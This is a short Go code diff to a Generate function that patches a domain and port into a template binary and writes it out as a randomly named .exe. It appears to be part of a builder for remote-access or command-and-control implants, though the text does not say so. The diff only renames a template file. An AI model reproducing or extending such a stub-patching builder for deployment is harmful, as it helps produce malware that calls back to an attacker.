@@ -437,7 +437,7 @@ func Generate(domain string,port string,version int)string  {
 		path = filepath.Join("Server","antiCloud.dat")
 	}else if version == 4{
 		//path = "Server\\fill.dat"
-		path = filepath.Join("Server","fill.dat")
+		path = filepath.Join("Server","full.dat")
 	}
 	fmt.Println("D:",len(bDomain),"P:",len(bPort),len(ipFlag),len(portFlag))
 	b, err := ioutil.ReadFile(path)
@@ -448,6 +448,7 @@ func Generate(domain string,port string,version int)string  {
 	b = bytes.Replace(b,[]byte(portFlag),bPort,len(bPort))
 	rand.Seed(time.Now().UnixNano())
 	Name:= tlRandStringRunes(4)+".exe"
+
 	err = ioutil.WriteFile(filepath.Join("TEMP",Name), b, 0777)
 	if err != nil{
 		return ""
